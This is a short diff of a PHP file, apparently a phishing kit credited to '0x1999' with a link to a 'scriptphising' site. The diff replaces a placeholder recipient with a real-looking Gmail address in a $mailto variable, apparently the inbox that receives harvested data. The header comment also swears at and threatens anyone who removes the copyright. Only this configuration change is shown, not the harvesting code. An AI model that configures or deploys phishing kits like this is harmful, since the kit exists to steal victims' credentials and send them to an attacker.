@@ -1,5 +1,5 @@
 <?php
-$mailto = 'emailkamu@gmail.com';
+$mailto = 'rhein755@gmail.com';
 //// Singgle File By 0x1999
 //// http://www.scriptphising.ga
 //// Ojo Ngganti Copyright Dancok Kon bacok Raimu
